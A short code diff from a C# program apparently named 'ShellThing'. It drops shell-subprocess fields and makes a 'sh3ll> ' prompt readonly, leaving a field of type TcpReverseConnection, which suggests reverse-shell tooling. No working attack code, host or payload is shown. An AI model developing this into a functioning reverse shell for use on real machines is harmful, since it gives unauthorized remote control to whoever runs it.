@@ -6,9 +6,7 @@ namespace ShellThing
     class Program
     {
         static TcpReverseConnection connection;
-        static ShellSubProcess shell;
-        static SubProcessIoManager processIoManager;
-        static string prompt = "sh3ll> ";
+        static readonly string prompt = "sh3ll> ";
 
         static void Main(string[] args)
         {
